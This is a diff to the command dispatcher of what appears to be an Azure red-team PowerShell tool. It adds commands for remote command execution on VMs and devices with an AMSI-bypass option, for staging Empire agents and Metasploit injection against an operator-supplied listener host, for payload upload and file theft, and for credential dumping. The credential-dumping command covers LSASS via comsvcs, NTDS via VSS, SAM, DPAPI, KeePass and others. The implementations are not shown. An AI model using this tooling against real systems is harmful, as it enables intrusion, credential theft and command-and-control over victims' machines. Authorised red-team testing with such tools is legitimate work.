         Invoke-VMProcessEnumeration -ResourceGroup $ResourceGroup -SubscriptionId $SubscriptionId -VMFilter $VMFilter -ProcessName $ProcessName -ExportPath $ExportPath
     }
+    "lockscreen-enum" {
+        Invoke-LockscreenEnumeration -ResourceGroup $ResourceGroup -SubscriptionId $SubscriptionId -VMFilter $VMFilter -ExportPath $ExportPath
+    }
     "local-groups" {
         Invoke-AdministrativeUnitsEnumeration -ShowMembers $ShowOwners -ExportPath $ExportPath
     }
     "av-enum" {
         Invoke-SecurityEnumeration -Filter $Filter -ExportPath $ExportPath
     }
+    "intune-enum" {
+        Invoke-IntuneEnumeration -ExportPath $ExportPath
+    }
+    "delegation-enum" {
+        Invoke-DelegationEnumeration -ExportPath $ExportPath
+    }
+    "exec" {
+        # Validate exec command has required parameter
+        if (-not $x) {
+            Write-ColorOutput -Message "[!] Error: -x parameter is required for exec command" -Color "Red"
+            Write-ColorOutput -Message "[*] Usage: .\azx.ps1 exec -VMName 'vm-name' -x 'command'" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 exec -ResourceGroup 'RG' -x 'command' -AllVMs" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 exec -DeviceName 'device-name' -x 'command'" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 exec -x 'command' -AllDevices" -Color "Yellow"
+            return
+        }
+        Invoke-RemoteCommandExecution -x $x -VMName $VMName `
+            -ResourceGroup $ResourceGroup -SubscriptionId $SubscriptionId `
+            -VMFilter $VMFilter -ExecMethod $ExecMethod `
+            -PowerShell:$PowerShell -AllVMs:$AllVMs `
+            -DeviceName $DeviceName -AllDevices:$AllDevices `
+            -Timeout $Timeout -ExportPath $ExportPath `
+            -AmsiBypass $AmsiBypass `
+            -PID $TargetPID -TargetUser $TargetUser
+    }
+    "empire-exec" {
+        # Validate empire-exec command has required parameter
+        if (-not $Listener) {
+            Write-ColorOutput -Message "[!] Error: -Listener parameter is required for empire-exec command" -Color "Red"
+            Write-ColorOutput -Message "[*] Usage: .\azx.ps1 empire-exec -Listener 'http' -EmpireHost 'empire.com' -VMName 'vm-name'" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 empire-exec -Listener 'http' -EmpireConfigFile 'config.json' -AllVMs" -Color "Yellow"
+            return
+        }
+        $obfuscateCmd = if ($ObfuscateCommand) { $ObfuscateCommand } else { "Token,All,1" }
+        Invoke-EmpireExecution -Listener $Listener `
+            -EmpireHost $EmpireHost -EmpirePort $EmpirePort `
+            -EmpireUsername $EmpireUsername -EmpirePassword $EmpirePassword `
+            -SSL:$SSL -Obfuscate:$Obfuscate -ObfuscateCommand $obfuscateCmd `
+            -EmpireConfigFile $EmpireConfigFile `
+            -VMName $VMName -AllVMs:$AllVMs -DeviceName $DeviceName -AllDevices:$AllDevices `
+            -ResourceGroup $ResourceGroup -SubscriptionId $SubscriptionId `
+            -ExecMethod $ExecMethod -Timeout $Timeout -AmsiBypass $AmsiBypass `
+            -ExportPath $ExportPath
+    }
+    "met-inject" {
+        # Validate met-inject command has required parameters
+        if (-not $SRVHOST -or -not $SRVPORT -or -not $RAND) {
+            Write-ColorOutput -Message "[!] Error: -SRVHOST, -SRVPORT, and -RAND parameters are required for met-inject command" -Color "Red"
+            Write-ColorOutput -Message "[*] Usage: .\azx.ps1 met-inject -SRVHOST '10.10.10.1' -SRVPORT 8080 -RAND 'abc123' -VMName 'vm-name'" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 met-inject -SRVHOST '10.10.10.1' -SRVPORT 8080 -RAND 'abc123' -AllVMs -SSL" -Color "Yellow"
+            return
+        }
+        Invoke-MetasploitInjection -SRVHOST $SRVHOST -SRVPORT $SRVPORT -RAND $RAND `
+            -SSL:$SSL -ProxyHost $ProxyHost -ProxyPort $ProxyPort `
+            -VMName $VMName -AllVMs:$AllVMs -DeviceName $DeviceName -AllDevices:$AllDevices `
+            -ResourceGroup $ResourceGroup -SubscriptionId $SubscriptionId `
+            -ExecMethod $ExecMethod -Timeout $Timeout -AmsiBypass $AmsiBypass `
+            -ExportPath $ExportPath
+    }
+    "spider" {
+        # Determine spider mode based on parameters
+        # If VM/Device targeting is specified, run those spiders
+        # If no VM/Device targeting, run storage spider (default)
+
+        $runStorageSpider = $false
+        $runVMSpider = $false
+        $runDeviceSpider = $false
+
+        # Determine what to spider based on parameters
+        if ($VMName -or $AllVMs -or $VMsOnly) {
+            $runVMSpider = $true
+        }
+        if ($DeviceName -or $AllDevices -or $DevicesOnly) {
+            $runDeviceSpider = $true
+        }
+        if ($StorageOnly -or (-not $runVMSpider -and -not $runDeviceSpider)) {
+            # Default: storage spider if no VM/Device params
+            $runStorageSpider = $true
+        }
+
+        # Run Storage Spider
+        if ($runStorageSpider) {
+            Invoke-SpiderEnumeration -ResourceGroup $ResourceGroup -SubscriptionId $SubscriptionId `
+                -Pattern $Pattern -Download:$Download -MaxFileSize $MaxFileSize `
+                -OutputFolder $OutputFolder -Depth $Depth -BlobsOnly:$BlobsOnly `
+                -SharesOnly:$SharesOnly -StorageAccount $StorageAccountTarget `
+                -Container $ContainerTarget -ExportPath $ExportPath
+        }
+
+        # Run VM Spider
+        if ($runVMSpider) {
+            Invoke-VMSpiderEnumeration -VMName $VMName -AllVMs:$AllVMs `
+                -ResourceGroup $ResourceGroup -SubscriptionId $SubscriptionId `
+                -Pattern $Pattern -StartPath $StartPath -ExcludePaths $ExcludePaths `
+                -Depth $Depth -Download:$Download -OutputFolder $OutputFolder `
+                -MaxFileSize $MaxFileSize -ExportPath $ExportPath
+        }
+
+        # Run Device Spider
+        if ($runDeviceSpider) {
+            Invoke-DeviceSpiderEnumeration -DeviceName $DeviceName -AllDevices:$AllDevices `
+                -ResourceGroup $ResourceGroup -SubscriptionId $SubscriptionId `
+                -ExecMethod $ExecMethod -Pattern $Pattern -StartPath $StartPath `
+                -ExcludePaths $ExcludePaths -Depth $Depth -Download:$Download `
+                -OutputFolder $OutputFolder -MaxFileSize $MaxFileSize -ExportPath $ExportPath
+        }
+    }
+    "get-file" {
+        # Validate get-file command has required parameters
+        if (-not $RemotePath -or -not $LocalPath) {
+            Write-ColorOutput -Message "[!] Error: -RemotePath and -LocalPath parameters are required for get-file command" -Color "Red"
+            Write-ColorOutput -Message "[*] Usage: .\azx.ps1 get-file -VMName 'vm-01' -RemotePath 'C:\path\file.txt' -LocalPath '.\file.txt'" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 get-file -DeviceName 'arc-01' -RemotePath '/etc/passwd' -LocalPath '.\passwd'" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 get-file -StorageAccountTarget 'acct' -ContainerTarget 'data' -RemotePath 'file.txt' -LocalPath '.\file.txt'" -Color "Yellow"
+            return
+        }
+        Invoke-GetFile -RemotePath $RemotePath -LocalPath $LocalPath `
+            -VMName $VMName -DeviceName $DeviceName `
+            -StorageAccountTarget $StorageAccountTarget -ContainerTarget $ContainerTarget `
+            -ResourceGroup $ResourceGroup -SubscriptionId $SubscriptionId `
+            -MaxFileSize $MaxFileSize -ExportPath $ExportPath
+    }
+    "put-file" {
+        # Validate put-file command has required parameters
+        if (-not $LocalPath -or -not $RemotePath) {
+            Write-ColorOutput -Message "[!] Error: -LocalPath and -RemotePath parameters are required for put-file command" -Color "Red"
+            Write-ColorOutput -Message "[*] Usage: .\azx.ps1 put-file -VMName 'vm-01' -LocalPath '.\payload.ps1' -RemotePath 'C:\Temp\payload.ps1'" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 put-file -DeviceName 'arc-01' -LocalPath '.\script.sh' -RemotePath '/tmp/script.sh'" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 put-file -StorageAccountTarget 'acct' -ContainerTarget 'uploads' -LocalPath '.\file.txt' -RemotePath 'folder/file.txt'" -Color "Yellow"
+            return
+        }
+        Invoke-PutFile -LocalPath $LocalPath -RemotePath $RemotePath `
+            -VMName $VMName -DeviceName $DeviceName `
+            -StorageAccountTarget $StorageAccountTarget -ContainerTarget $ContainerTarget `
+            -ResourceGroup $ResourceGroup -SubscriptionId $SubscriptionId `
+            -ExportPath $ExportPath
+    }
+    "creds" {
+        # Validate creds command has target specification
+        if (-not $VMName -and -not $AllVMs -and -not $DeviceName -and -not $AllDevices) {
+            Write-ColorOutput -Message "[!] Error: Target specification required for creds command" -Color "Red"
+            Write-ColorOutput -Message "[*] Usage: .\azx.ps1 creds -VMName 'vm-01'" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -AllVMs -CredMethod sam" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -VMName 'vm-01' -CredMethod tokens" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -DeviceName 'arc-01' -CredMethod dpapi" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -VMName 'dc-01' -CredMethod lsa" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -VMName 'dc-01' -CredMethod ntds -NTDSMethod vss" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -VMName 'vm-01' -CredMethod lsass -LsassMethod comsvcs" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -VMName 'vm-01' -CredMethod backup" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -VMName 'vm-01' -CredMethod sccm" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -VMName 'vm-01' -CredMethod wam" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -AllVMs -CredMethod all -ExportPath creds.json" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -VMName 'vm-01' -CredMethod wifi" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -VMName 'vm-01' -CredMethod putty" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -VMName 'vm-01' -CredMethod winscp" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -VMName 'vm-01' -CredMethod vnc" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -VMName 'vm-01' -CredMethod mremoteng" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -VMName 'vm-01' -CredMethod notepad" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -VMName 'vm-01' -CredMethod notepadpp" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -VMName 'vm-01' -CredMethod keepass_discover" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -VMName 'vm-01' -CredMethod keepass_trigger -KeePassAction all" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -VMName 'vm-01' -CredMethod rdcman" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -VMName 'vm-01' -CredMethod eventlog_creds" -Color "Yellow"
+            Write-ColorOutput -Message "[*]        .\azx.ps1 creds -VMName 'vm-01' -CredMethod veeam" -Color "Yellow"
+            return
+        }
+        Invoke-CredentialExtraction -VMName $VMName -AllVMs:$AllVMs `
+            -DeviceName $DeviceName -AllDevices:$AllDevices `
+            -ResourceGroup $ResourceGroup -SubscriptionId $SubscriptionId `
+            -CredMethod $CredMethod -HashcatFormat:$HashcatFormat -JohnFormat:$JohnFormat `
+            -AmsiBypass $AmsiBypass -Timeout $Timeout -ExportPath $ExportPath `
+            -ExecMethod $ExecMethod `
+            -NTDSMethod $NTDSMethod -LsassMethod $LsassMethod -SCCMMethod $SCCMMethod `
+            -EnabledOnly:$EnabledOnly -TargetDomainUser $TargetDomainUser `
+            -PVKFile $PVKFile -MasterKeyFile $MasterKeyFile `
+            -KeePassConfigPath $KeePassConfigPath -KeePassAction $KeePassAction -KeePassExportPath $KeePassExportPath
+    }
     "help" {
         Show-Help
     }
     default {
         Write-ColorOutput -Message "[!] Unknown command: $Command" -Color "Red"
-        Write-ColorOutput -Message "[*] Available commands: hosts, tenant, users, user-profiles, rid-brute, groups, pass-pol, guest, vuln-list, sessions, guest-vuln-scan, apps, sp-discovery, roles, ca-policies, vm-loggedon, storage-enum, keyvault-enum, network-enum, shares-enum, disks-enum, bitlocker-enum, local-groups, av-enum, process-enum, help" -Color "Yellow"
+        Write-ColorOutput -Message "[*] Available commands: hosts, tenant, users, user-profiles, rid-brute, groups, pass-pol, guest, spray, vuln-list, sessions, guest-vuln-scan, apps, sp-discovery, roles, ca-policies, vm-loggedon, storage-enum, keyvault-enum, network-enum, shares-enum, disks-enum, bitlocker-enum, local-groups, av-enum, process-enum, lockscreen-enum, intune-enum, delegation-enum, exec, empire-exec, met-inject, spider, get-file, put-file, creds, help" -Color "Yellow"
     }
 }
 
